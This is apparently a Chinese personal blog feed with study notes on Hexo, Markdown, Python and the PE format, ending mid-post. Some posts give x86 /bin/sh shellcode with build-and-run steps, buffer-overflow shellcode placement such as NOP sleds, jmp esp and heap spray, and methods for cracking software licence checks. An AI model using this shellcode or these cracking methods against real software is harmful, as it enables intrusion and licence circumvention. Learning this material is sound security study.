      <content type="html"><![CDATA[<h1 id="软件保护"><a href="#软件保护" class="headerlink" title="软件保护"></a>软件保护</h1><h2 id="简单算法注册保护："><a href="#简单算法注册保护：" class="headerlink" title="简单算法注册保护："></a>简单算法注册保护：</h2><p>输入用户名序列号，计算并检测序列号；</p><h2 id="简单算法注册保护的对抗："><a href="#简单算法注册保护的对抗：" class="headerlink" title="简单算法注册保护的对抗："></a>简单算法注册保护的对抗：</h2><p>①修改关键指令：暴力破解；patcher<br>②dll注入或使用加载器（使序列号计算结果展示出来）；内存注册机<br>③还原本身算法；keygen</p><h2 id="复杂算法注册保护："><a href="#复杂算法注册保护：" class="headerlink" title="复杂算法注册保护："></a>复杂算法注册保护：</h2><p>通常内置rsa公钥/签名/绑定硬件码/注册信息分段校验/运行时校验等；</p><h2 id="复杂算法注册保护的对抗："><a href="#复杂算法注册保护的对抗：" class="headerlink" title="复杂算法注册保护的对抗："></a>复杂算法注册保护的对抗：</h2><p>①patch<br>②补丁修改公钥，使用自己的公钥对；</p><h2 id="网络加密及硬件加密："><a href="#网络加密及硬件加密：" class="headerlink" title="网络加密及硬件加密："></a>网络加密及硬件加密：</h2><p>本质上与本地加密相同/运行前检测？？</p><h2 id="网络加密及硬件加密的对抗："><a href="#网络加密及硬件加密的对抗：" class="headerlink" title="网络加密及硬件加密的对抗："></a>网络加密及硬件加密的对抗：</h2><p>①patch<br>②模拟与远程端的通信，及模拟执行；<br>③使用中转程序，从服务器获得远程执行结果；</p><h2 id="复杂系统注册保护："><a href="#复杂系统注册保护：" class="headerlink" title="复杂系统注册保护："></a>复杂系统注册保护：</h2><p>以上内容混杂</p><p>附：常用–壳（压缩壳/加密壳）：程序运行前的检测，校验/程序注册机制/程序运行二次检测</p><h1 id="软件破解及对抗"><a href="#软件破解及对抗" class="headerlink" title="软件破解及对抗"></a>软件破解及对抗</h1><h2 id="程序分析及对抗："><a href="#程序分析及对抗：" class="headerlink" title="程序分析及对抗："></a>程序分析及对抗：</h2><ul><li>代码变形mutation；</li><li>代码膨胀expansion；</li><li>花指令；</li><li>代码乱序；</li><li>平坦化；</li></ul><h2 id="程序调试及对抗："><a href="#程序调试及对抗：" class="headerlink" title="程序调试及对抗："></a>程序调试及对抗：</h2><ul><li>系统API检测程序是否处于被调试状态；</li><li>检测调试器窗口信息、状态码；</li><li>检测调试器驱动，符号；</li><li>程序执行行为检测（如检测运行时间，时间较长则处于被调试状态）；</li><li>利用驱动接管本身程序的中断，阻止被调试器接管；</li><li>利用驱动修改内核参数，阻止程序被调试；</li><li>双进程反调试；</li></ul><h2 id="程序修改及对抗："><a href="#程序修改及对抗：" class="headerlink" title="程序修改及对抗："></a>程序修改及对抗：</h2><p>修改：文件补丁技术及工具；<br>对抗修改： hash校验/内存关键部分CRC校验/ipk劫持等；</p><p><em>dnspy：.NET程序逆向工具</em></p>]]></content>
      
      <categories>
          
          <category> RE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RE </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Hexo Essay Writing</title>
      <link href="/2018/08/15/hexo-essay-writing/"/>
      <url>/2018/08/15/hexo-essay-writing/</url>
      <content type="html"><![CDATA[<ol><li>打开git,进入MyBlog目录；</li><li>输入 <code>hexo new &quot;essay-name&quot;</code>；</li><li>打开source文件夹，找到 essay-name.md，使用markdown语法写作；</li><li>执行命令 <code>/ hexo clean / hexo generate/ hexo deploy</code>；</li><li>over；</li></ol><p><strong>假如hexo命令出现问题，基本上就是_config.yml 文件的空格有问题，看报错就好了。</strong></p>]]></content>
      
      <categories>
          
          <category> skills </category>
          
      </categories>
      
      
        <tags>
            
            <tag> skills </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Markdown standard</title>
      <link href="/2018/08/13/markdown%E8%A7%84%E8%8C%83%E5%AD%A6%E4%B9%A0/"/>
      <url>/2018/08/13/markdown%E8%A7%84%E8%8C%83%E5%AD%A6%E4%B9%A0/</url>
      <content type="html"><![CDATA[<h1 id="MarkDown-v1-0"><a href="#MarkDown-v1-0" class="headerlink" title="MarkDown v1.0"></a>MarkDown v1.0</h1><h2 id="1-1-全局规范"><a href="#1-1-全局规范" class="headerlink" title="1.1 全局规范"></a>1.1 全局规范</h2><p><a name="top"></a></p><ul><li>MarkDown 文件使用‘.md’结尾 （<strong>小写字母</strong>)</li></ul><h2 id="格式规范"><a href="#格式规范" class="headerlink" title="格式规范"></a>格式规范</h2><h3 id="标题结构格式"><a href="#标题结构格式" class="headerlink" title="标题结构格式"></a>标题结构格式</h3><p>1.标题与紧贴的’上下正文‘使用’1整行换行‘隔开<br>2.’#’号和文字之间’一个空格’连接<br>3.标题层级最多六级 ‘#’到’######’</p><h3 id="加强和强调规范"><a href="#加强和强调规范" class="headerlink" title="加强和强调规范"></a>加强和强调规范</h3><p>一般统一使用第一种</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*emphasize*</span><br><span class="line">_emphasize_</span><br></pre></td></tr></table></figure><p>使用’~~’给文字添加删除线<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~~strikethrough~~</span><br></pre></td></tr></table></figure></p><h3 id="代码块规范"><a href="#代码块规范" class="headerlink" title="代码块规范"></a>代码块规范</h3><ul><li>行内代码使用’一对波浪号’如：<code>hello world!</code></li><li>块级代码使用’三个波浪号’或’整体四空格缩进’，且上下均用整行隔开，如下：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo &apos;看源码之三个波浪号&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><pre><code>&lt;?php    echo &apos;看源码之四空格缩进&apos;;?&gt;</code></pre><h3 id="列表写法"><a href="#列表写法" class="headerlink" title="列表写法"></a>列表写法</h3><ul><li>列号’1.’或者’*’后内容用空格隔开</li><li>列表块前后’整行隔开’ 如下：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. Windows  </span><br><span class="line">2. Mac</span><br><span class="line">3. iOS</span><br><span class="line">    * iPhone</span><br><span class="line">    * iPad</span><br><span class="line">4. Android</span><br></pre></td></tr></table></figure><p><strong>实际预览：</strong></p><ol><li>Windows  </li><li>Mac</li><li>iOS<ul><li>iPhone</li><li>iPad</li></ul></li><li>Android</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">* Windows  </span><br><span class="line">*  Mac</span><br><span class="line">*  iOS</span><br><span class="line">*  Android</span><br><span class="line">    1. v3.2</span><br><span class="line">    2. v4.1</span><br></pre></td></tr></table></figure><p><strong>实际预览：</strong></p><ul><li>Windows  </li><li>Mac</li><li>iOS</li><li>Android<ol><li>v3.2</li><li>v4.1</li></ol></li></ul><h3 id="其他标签规范"><a href="#其他标签规范" class="headerlink" title="其他标签规范"></a>其他标签规范</h3><p>链接和email</p><p>Inline：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">An [example](http://url.com/ &quot;title&quot;)</span><br></pre></td></tr></table></figure><p>实现效果：<br>An <a href="http://url.com/" title="title" target="_blank" rel="noopener">example</a></p><p>引用样式标签（titles are optional）:</p><pre><code>An [example][id].Then,anywhereelse in the doc,define the link:[id]:http://example.com/ &quot;title&quot;</code></pre><p>Email:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">An email &lt;example@example.com&gt; link.</span><br></pre></td></tr></table></figure><p>插图<br>Inline(titles are optional)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![alt text](/path/img.jpg &quot;title&quot;)</span><br></pre></td></tr></table></figure><p>引用式插图：</p><pre><code>![alt text][id][id]:/url/to/img.jpg &quot;title&quot;</code></pre><p>引用块及嵌套</p><blockquote><p>Email-style angle brackets<br>are used for blockquotes.</p></blockquote><blockquote><blockquote><p>And, they can be nested.</p></blockquote></blockquote><blockquote><h4 id="Headers-in-blockquotes"><a href="#Headers-in-blockquotes" class="headerlink" title="Headers in blockquotes"></a>Headers in blockquotes</h4><ul><li>You can quote a list.</li><li>Etc.</li></ul></blockquote><p>内联代码</p><p><code>&lt;code&gt;</code> 段落中的用法</p><p>也可以 <code>`代码中包含波浪号`</code>.<br>代码块</p><p>Indent every line of a code block by at least 4 spaces or 1 tab.<br>代码的每行都最少用4个空格或者一个制表符(tab)</p><p>我是普通文本块</p><pre><code>我是一个预格式化的代码块.</code></pre><p>水平分割线<br>三个<code>连字符-</code>:</p><hr><h3 id="表格规范"><a href="#表格规范" class="headerlink" title="表格规范"></a>表格规范</h3><p>一个简单的表格看起来如下：</p><table><thead><tr><th>第一个头部</th><th>第二个头部</th><th>第三个头部</th></tr></thead><tbody><tr><td>内容格子</td><td>内容格子</td><td>内容格子</td></tr><tr><td>内容格子</td><td>内容格子</td><td>内容格子</td></tr></tbody></table><p>每列的对齐可以通过在分割线上添加冒号来实现：</p><table><thead><tr><th style="text-align:left">第一个头部</th><th style="text-align:center">第二个头部</th><th style="text-align:right">第三个头部</th></tr></thead><tbody><tr><td style="text-align:left">左对齐</td><td style="text-align:center">居中</td><td style="text-align:right">右对齐</td></tr><tr><td style="text-align:left">左对齐</td><td style="text-align:center">居中</td><td style="text-align:right">右对齐</td></tr></tbody></table><h3 id="页内锚标记"><a href="#页内锚标记" class="headerlink" title="页内锚标记"></a>页内锚标记</h3><ul><li><a href="#11全局规范">点我跳转到顶部</a>   // 利用 <code>#</code>,<code>##</code> 生成 <code>id</code> 锚标签  </li><li><a href="#top">另一种锚标记</a> // 利用 <code>&lt;a name=&quot;top&quot;&gt;&lt;/a&gt;</code></li></ul><hr><p>附：参考 Hello-World.md 源码，<em>注意换行的使用</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># Hello-World</span><br><span class="line"></span><br><span class="line">这是一个范例文件格式</span><br><span class="line">我是普通换行</span><br><span class="line"></span><br><span class="line">## 我是&lt;h2&gt;标题</span><br><span class="line"></span><br><span class="line">我是`&lt;h2&gt;`的内容</span><br><span class="line"></span><br><span class="line">## 我是&lt;h3&gt;标题</span><br><span class="line"></span><br><span class="line">* Windows  </span><br><span class="line">*  Mac</span><br><span class="line">*  iOS</span><br><span class="line">*  Android</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> skills </category>
          
      </categories>
      
      
        <tags>
            
            <tag> skills </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Introduction to pwn1.1</title>
      <link href="/2018/08/13/pwn-%E5%85%A5%E9%97%A81-1/"/>
      <url>/2018/08/13/pwn-%E5%85%A5%E9%97%A81-1/</url>
      <content type="html"><![CDATA[<h3 id="各种变量的存储位置"><a href="#各种变量的存储位置" class="headerlink" title="各种变量的存储位置"></a>各种变量的存储位置</h3><ol><li>stack：局部变量</li><li>heap: 动态分配内存的变量（malloc/new）</li><li>bss section: 全局化的未初始化的变量</li><li>data section: 全局化的已初始化的变量<ul><li>rodata: （只读data段）全局化的静态变量（const）</li></ul></li></ol><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int a = 0;   //.data</span><br><span class="line">int b;       //.bss</span><br><span class="line">const double PI = 3.1415    //rodata</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    int c = 2;    //stack</span><br><span class="line">char *d = malloc(16);    //heap</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="linux下将shellcode运行"><a href="#linux下将shellcode运行" class="headerlink" title="linux下将shellcode运行"></a>linux下将shellcode运行</h3><p>1.手写简易shellcode</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">jmp sh</span><br><span class="line">run:</span><br><span class="line">    pop ebx</span><br><span class="line">    mov BYTE [ebx+7],0</span><br><span class="line">    xor eax,eax</span><br><span class="line">    mov al,11</span><br><span class="line">    xor ecx,ecx</span><br><span class="line">    xor edx,edx</span><br><span class="line">    int 0x80</span><br><span class="line">sh:</span><br><span class="line">    call run</span><br><span class="line">    db &quot;/bin/sh&quot;</span><br></pre></td></tr></table></figure><p>2.一系列步骤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Assembly:  nasm a.asm -o a.o -felf32   </span><br><span class="line">Extract Shellcode: objcopy -O binary a.o code   //将a.o中需要用内容的提取到code中</span><br><span class="line">                   xxd -i code        //将提取出来的code转换为机器码</span><br></pre></td></tr></table></figure><p>3.带入调用shellcode的程序test.c</p><pre><code>#include  &quot;code.h&quot;typedef int(*CODE)();int main(){    ((CODE)shellcode)();}Run Shellcode: gcc test.c -o test -m32 -zexexstack       </code></pre>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> stack </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Learning python</title>
      <link href="/2018/08/02/learning-python/"/>
      <url>/2018/08/02/learning-python/</url>
      <content type="html"><![CDATA[<p><em>最近将之前的博客逐渐搬运过来，因为可怜的服务器要到期了hhh</em></p><p><em>为了能够完成各色python脚本的编写，迫不得已入门python大法！ 以下为简易的py语法：</em></p><h1 id="Python-string"><a href="#Python-string" class="headerlink" title="Python string"></a>Python string</h1><ol><li><p>对于单个字符的编码，Python提供了ord()函数获取字符的整数表示，chr()函数把编码转换为对应的字符；</p><p>eg： ord(‘A’)  -&gt;65    chr(66) -&gt;B</p></li><li><p>对bytes类型的数据用带b前缀的单引号或双引号表示： x=b’abc’；</p></li><li><p>可以通过encode() 将Unicode表示的str编码为指定的 bytes；</p></li><li><p>格式化输出字符串：</p></li></ol><ul><li><p>c语言格式；</p></li><li><p>format 方法’aaaa{0}bbbb{1}cccccc……’.format(para1,para2…)参数会依次取代占位符{0} {1}{…}；</p></li></ul><h1 id="python-list-and-tuple"><a href="#python-list-and-tuple" class="headerlink" title="python list and tuple"></a>python list and tuple</h1><ol><li>list（列表） ：classmates = [‘elementl’, ‘element2’, [‘element31’,’element32’],’element4’]</li></ol><ul><li><p>len()得到元素个数；</p></li><li><p>classmates[-n]可以得到倒数第n个元素；</p></li><li><p>classmates.append(‘element’)追加元素到末尾；</p></li><li><p>insert(n,’element’)插入到指定位置；</p></li><li><p>pop()删除末尾元素；pop(i)删除指定位置元素；</p></li><li><p>classmates[n]=’element’直接替换为别的元素；</p></li><li><p>list元素可以是另一个list。</p></li></ul><ol start="2"><li>tuple（元组）： classmates = (‘elementl’, ‘element2’, (‘element31’,’element32’),’element4’)</li></ol><ul><li><p>一旦初始化就不能修改（每个元素指向不变），一定程度上相当于const；</p></li><li><p>获取元素方法与list相同；</p></li><li><p>当只有一个元素时  t=(1,) 需要使用’，’来消除歧义；</p></li><li><p>tuple中包含list元素时，list中的元素可以变，因为对tuple来说其指向并没有改变。</p></li></ul><h1 id="python-dic"><a href="#python-dic" class="headerlink" title="python dic"></a>python dic</h1><p>  （同c++map）</p><p>d = {‘key1’: value1, ‘key2’: value2, ‘key3’: value3}    =&gt;  d[‘key1’] -&gt;value1</p><p>为避免key不存在：</p><ul><li>‘key’ in d 不存在则返回False；       </li><li>d.get(‘key’,value) 不存在则返回value；</li><li>pop(key)可以删除key即对应的value。</li></ul><h1 id="python-set"><a href="#python-set" class="headerlink" title="python set"></a>python set</h1><ul><li><p>set也是一组key的集合但不储存value；key不能重复。</p></li><li><p>创建set需要提供一个list作为输入集合 s = set([1,2,3]);</p></li><li><p>add(key)添加key ；remove(key)删除key。</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">和list比较，dict有以下几个特点：</span><br><span class="line"></span><br><span class="line">    查找和插入的速度极快，不会随着key的增加而变慢；</span><br><span class="line">    需要占用大量的内存，内存浪费多。</span><br><span class="line"></span><br><span class="line">而list相反：</span><br><span class="line"></span><br><span class="line">    查找和插入的时间随着元素的增加而增加；</span><br><span class="line">    占用空间小，浪费内存很少。</span><br><span class="line"></span><br><span class="line">所以，dict是用空间来换取时间的一种方法。</span><br></pre></td></tr></table></figure><h1 id="python-loop"><a href="#python-loop" class="headerlink" title="python loop"></a>python loop</h1><ol><li><p>for i in list/tuple:  把list或tuple中的每个元素带入i，执行之后缩进块的语句；</p><p>range()函数可以生成一个整数序列，list(range(n))可以将其转化为list；</p></li><li><p>while xxx：</p></li><li><p>break / continue 同c。</p></li></ol><h1 id="python-func"><a href="#python-func" class="headerlink" title="python func"></a>python func</h1><ul><li><p>空函数：pass用来做占位符，让代码格式正确。</p></li><li><p>可以返回多个值，实质上是返回的tuple；</p></li><li><p>None 为不变对象，需要时可以将函数的参数定义为不变对象，这样在每次调用时都是从初始定义的变量开始。（即python函数参数变量默认等于c语言的static，加上none可以去掉static）</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#Python2.7在一行输入多个数字的方法：</span><br><span class="line"></span><br><span class="line">         输入一个数字 m = int(raw_input())</span><br><span class="line"></span><br><span class="line">输入多个数字是 m, n,.... = map(int, raw_input().split())</span><br></pre></td></tr></table></figure><ul><li><p>可变参数：   函数 def funcname(‘*’args):定义一个参数数量不定的list/tuple L,  调用funcname(L)即可；</p></li><li><p>关键字参数：函数def funcname(a,b,’<em>‘’</em>‘kw):c为关键字参数（例如用户注册 ab为必填项 c为选填项）；调用时funcname(A,B,e=E,f=F);</p></li><li><p>命名关键字参数：函数def funcname(a,b,’<em>‘,c,d):’</em>‘后面为命名关键字参数，即选填项只能是定义的key；也可以是 def funcname(a,b,’<em>‘,c,d，e):可变参数</em>c后面的命名关键字参数不必再加’*’；对于前者，调用时funcname(A,B,c=C,d=D);</p></li></ul><h1 id="python-slice"><a href="#python-slice" class="headerlink" title="python slice"></a>python slice</h1><p>用于取一个list或tuple的部分元素:L = [‘element1’, ‘element2’, ‘element3’, ‘element4’, ‘element5’]</p><p>slice操作符使用：</p><p>  eg：取前三个元素 L[0:3] /L[:3]；取后两个元素L[-2:]；取倒数第二个元素L[-2:-1]；</p><p>  L[:10:2]前十个数里每两个取一个；L[::5]所有数每五个取一个；</p><h1 id="python-iteration"><a href="#python-iteration" class="headerlink" title="python iteration"></a>python iteration</h1><p>即循环遍历；</p><p>d = {‘a’: 1, ‘b’: 2, ‘c’: 3}</p><p>eg:</p><ul><li>循环迭代dict： for key in d://默认dict 迭代的是key ；<br>迭代value : for value in d.values()；<br>同时迭代 ：for k,v ind.items()</li></ul><ul><li>判断是否可迭代：通过collections模块的Iterable类型判断</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> from collections import Iterable </span><br><span class="line">isinstance(objects,Iterable)</span><br></pre></td></tr></table></figure><ul><li>下标循环的实现：通过内置的enumerate函数判断</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i, value in enumerate([&apos;A&apos;, &apos;B&apos;, &apos;C&apos;]):</span><br></pre></td></tr></table></figure><h1 id="python-list-generation"><a href="#python-list-generation" class="headerlink" title="python list generation"></a>python list generation</h1><p>eg：</p><ul><li><p>生成L=[1,4,9,….100]：<code>[x*x for x in range(1,100)]</code>;</p></li><li><p>筛选出仅偶数的平方：<code>[x*x for x in range(1,100) if x%2 ==0]</code>;</p></li><li><p>两层循环生成全排列：<code>[m+n for m in &#39;ABC&#39; for n in &#39;DEF&#39; ]</code>;</p></li><li><p>列出当前目录下所有文件即目录名：<code>import os  | [d for d in os.listdir(&#39;.&#39;)]</code>;</p></li><li><p>把一个list L 中所有字符串变为小写：<code>[s.lower() for s in L]</code>;</p></li></ul><h1 id="python-genarator"><a href="#python-genarator" class="headerlink" title="python genarator"></a>python genarator</h1><p>不必创建完整的list，节省大量空间；边循环边计算，称为生成器generator；</p><p>方法：将列表生成式的[]改为()即可；</p>]]></content>
      
      <categories>
          
          <category> skills </category>
          
      </categories>
      
      
        <tags>
            
            <tag> skills </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>The art 0f deploying shellcode</title>
      <link href="/2018/07/26/the-art-0f-deploying-shellcode/"/>
      <url>/2018/07/26/the-art-0f-deploying-shellcode/</url>
      <content type="html"><![CDATA[<p><em>转移自之前的博客</em></p><h1 id="shellcode布置"><a href="#shellcode布置" class="headerlink" title="shellcode布置"></a>shellcode布置</h1><ol><li><p>将shellcode放在缓冲区中（静态地址），即函数返回地址之前。//shellcode自身可能会被压栈数据破坏，难以动态定位</p><figure class="image-box">                <img src="/2018/07/26/the-art-0f-deploying-shellcode/图片1-2.png" alt="1" title="" class="">                <p>1</p>            </figure></li><li><p>使用jmp esp/call esp 指令作为跳板指令，定位shellcode，使shellcode正好布置在返回地址之后。//前栈帧数据被大范围破坏</p><figure class="image-box">                <img src="/2018/07/26/the-art-0f-deploying-shellcode/图片2-1.png" alt="2" title="" class="">                <p>2</p>            </figure></li><li><p>为尽量避免1,2的缺点，可以使用跳转指令定位shellcode，同时将shellcode布置在缓冲区内。</p><figure class="image-box">                <img src="/2018/07/26/the-art-0f-deploying-shellcode/图片3-1.png" alt="3" title="" class="">                <p>3</p>            </figure></li><li><p>为了使shellcode具有通用性/安全性，通常会在shellcode一开始大范围抬高栈顶，保护自身代码的完整性。</p><figure class="image-box">                <img src="/2018/07/26/the-art-0f-deploying-shellcode/图片4-1.png" alt="2" title="" class="">                <p>2</p>            </figure></li><li><p>某些情况下不允许使用跳板指令，静态地址又不够准确。可以淹没大片内存的情况下，将shellcode布置在一大段nop之后。此时定位shellcode时，只要能够跳进一大片nop之中即可。</p><figure class="image-box">                <img src="/2018/07/26/the-art-0f-deploying-shellcode/图片5-1.png" alt="2" title="" class="">                <p>2</p>            </figure></li><li><p>返回地址距离缓冲区偏移量不确定。若函数返回地址按双字节不定，可以用一片连续的跳转指令的地址来覆盖函数返回地址，只要有其中一个可以成功覆盖，shellcode就能执行。（待理解）</p><figure class="image-box">                <img src="/2018/07/26/the-art-0f-deploying-shellcode/图片7-1.png" alt="2" title="" class="">                <p>2</p>            </figure></li><li><p>按字节错位引起定位失败从而使shellcode无效。使用按字节相同的双字跳转地址，甚至使用堆中的地址，将shellcode用堆扩展的方法放置在相应区域（Heap spray）。（待理解）</p><figure class="image-box">                <img src="/2018/07/26/the-art-0f-deploying-shellcode/图片8-1.png" alt="2" title="" class="">                <p>2</p>            </figure><figure class="image-box">                <img src="/2018/07/26/the-art-0f-deploying-shellcode/图片8-2.png" alt="2" title="" class="">                <p>2</p>            </figure></li></ol><h1 id="shellcode的编码技术"><a href="#shellcode的编码技术" class="headerlink" title="shellcode的编码技术"></a>shellcode的编码技术</h1><ul><li>原因：</li></ul><ol><li><p>所有的字符串函数都会对NULL字节进行限制，通常需要在shellcode中选择特殊的指令避免直接出现NULL字节或字。</p></li><li><p>有些函数还会要求shellcode必须为可见字符的ASCII值或Unicode值。</p></li><li><p>基于特征的IDS系统往往会对常见的shellcode进行拦截。</p><figure class="image-box">                <img src="/2018/07/26/the-art-0f-deploying-shellcode/图片9-1.png" alt="2" title="" class="">                <p>2</p>            </figure><figure class="image-box">                <img src="/2018/07/26/the-art-0f-deploying-shellcode/图片10-1.png" alt="2" title="" class="">                <p>2</p>            </figure></li></ol><ul><li><p>解决：</p><p>编码。先编码使内容达到限制的要求，再构造解码程序放在shellcode开始执行的地方。</p></li></ul>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> tech </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>What&#39;s PE files?</title>
      <link href="/2018/07/23/what-s-pe-files/"/>
      <url>/2018/07/23/what-s-pe-files/</url>
      <content type="html"><![CDATA[<p><em>转移自之前的博客</em></p><h1 id="PE-文件概论"><a href="#PE-文件概论" class="headerlink" title="PE 文件概论"></a>PE 文件概论</h1><p>PE（portable Executable）windows系统下的可执行文件格式</p><p>1 . 32位可执行文件-PE32 ；</p><pre><code>64位可执行文件-PE+/PE32+ ，是PE文件的扩展形式。</code></pre><ol start="2"><li><p>分类：可执行系列 exe scr ；库系列 dll ocx cpl drv ；驱动程序系列 sys vxd ；对象文件系列 obj （唯一不可执行）。</p></li><li><p>基本结构</p><figure class="image-box">                <img src="/2018/07/23/what-s-pe-files/1.png" alt="1" title="" class="">                <p>1</p>            </figure></li></ol><p>DOS头到节区头是PE的头部分；</p><p>文件中使用偏移offset，内存中使用VA（virtual address 虚拟地址）表示位置；</p><ol start="4"><li>VA指进程虚拟内存的绝对地址，RVA指从某个基准位置开始的相对地址。</li></ol><p>RVA+ImageBase=VA</p><h1 id="PE头-1"><a href="#PE头-1" class="headerlink" title="PE头(1)"></a>PE头(1)</h1><figure class="image-box">                <img src="/2018/07/23/what-s-pe-files/2.png" alt="2" title="" class="">                <p>2</p>            </figure><p>1.DOS头：IMAGE_DOS_HEADER结构体<br><figure class="image-box">                <img src="/2018/07/23/what-s-pe-files/3.png" alt="3" title="" class="">                <p>3</p>            </figure></p><p>40个字节/ e_magic:DOS签名（4D5A 签名值MZ）/e_lfanew:指示NT头的偏移（小端序标识法）</p><p>2.DOS存根（stub）/可选项，大小不固定/DOS环境才会执行</p><p>3.NT头： IMAGE_NT_HEADERS结构体</p><figure class="image-box">                <img src="/2018/07/23/what-s-pe-files/4.png" alt="4" title="" class="">                <p>4</p>            </figure><p>F8个字节/三个成员：签名（50450000）+文件头+可选头。</p><p>①文件头：IMAGE_FILE_HEADER结构体<br><figure class="image-box">                <img src="/2018/07/23/what-s-pe-files/5.png" alt="5" title="" class="">                <p>5</p>            </figure><br>该结构体重要成员（设置不正确，程序无法运行）</p><figure class="image-box">                <img src="/2018/07/23/what-s-pe-files/6.png" alt="6" title="" class="">                <p>6</p>            </figure><figure class="image-box">                <img src="/2018/07/23/what-s-pe-files/7.png" alt="7" title="" class="">                <p>7</p>            </figure><figure class="image-box">                <img src="/2018/07/23/what-s-pe-files/8.png" alt="8" title="" class="">                <p>8</p>            </figure><p>②可选头： IMAGE_OPTIONAL_HEADER32<br><figure class="image-box">                <img src="/2018/07/23/what-s-pe-files/9.png" alt="9" title="" class="">                <p>9</p>            </figure><br>（PE头结构体中最大的）</p><p>重要成员<br><figure class="image-box">                <img src="/2018/07/23/what-s-pe-files/10.png" alt="10" title="" class="">                <p>10</p>            </figure><br><figure class="image-box">                <img src="/2018/07/23/what-s-pe-files/11.png" alt="11" title="" class="">                <p>11</p>            </figure><br><figure class="image-box">                <img src="/2018/07/23/what-s-pe-files/12.png" alt="12" title="" class="">                <p>12</p>            </figure></p><p>③节区头： IMAGE_SECTION_HEADER<br><figure class="image-box">                <img src="/2018/07/23/what-s-pe-files/13.png" alt="13" title="" class="">                <p>13</p>            </figure><br>不同内存属性访问权限：code  rwx /data rw /resource r<br><figure class="image-box">                <img src="/2018/07/23/what-s-pe-files/14.png" alt="14" title="" class="">                <p>14</p>            </figure><br>重要成员</p><h1 id="PE头-2"><a href="#PE头-2" class="headerlink" title="PE头(2)"></a>PE头(2)</h1><ol><li>内存地址与文件偏移间的映射：RVA to RAW（即file offset）</li></ol><p>公式：RAW - PointerToRawData = RVA -VirtualAddress</p><p>RAW = RVA -VirtualAddress + PointerToRawData<br><figure class="image-box">                <img src="/2018/07/23/what-s-pe-files/15.png" alt="15" title="" class="">                <p>15</p>            </figure><br>eg：</p><p>RVA = 5000 位于第一节区（.text），VA = 1000（该节区内存的的起始地址），</p><p>PointerToRawData= 400 （该节区文件的起始地址） 。</p><p>RAW = 5000 -1000 +400 